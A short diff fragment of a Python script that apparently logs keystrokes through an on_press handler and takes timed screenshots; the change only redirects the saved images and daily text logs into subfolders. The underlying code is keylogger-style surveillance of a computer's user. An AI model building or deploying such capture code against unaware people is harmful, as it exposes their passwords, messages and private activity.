@@ -18,7 +18,7 @@ def store_data():
     file_name = time.strftime("%d_%m_%Y_%H_%M_%S") + ".png"
 
     # Save the screenshot as an image file
-    screenshot.save(file_name)
+    screenshot.save("img/"+file_name)
     timer = threading.Timer(time_interval,store_data)
     timer.start()
 def on_press(key):
@@ -68,7 +68,7 @@ def on_press(key):
 def write_1(var):
     current_date = datetime.now().strftime("%d_%m_%Y")
     file_name = current_date + "_log.txt"
-    with open(file_name, "a") as f:
+    with open("txtlogging/"+file_name, "a") as f:
         f.write("\n"+var)
         global text
         text = ""
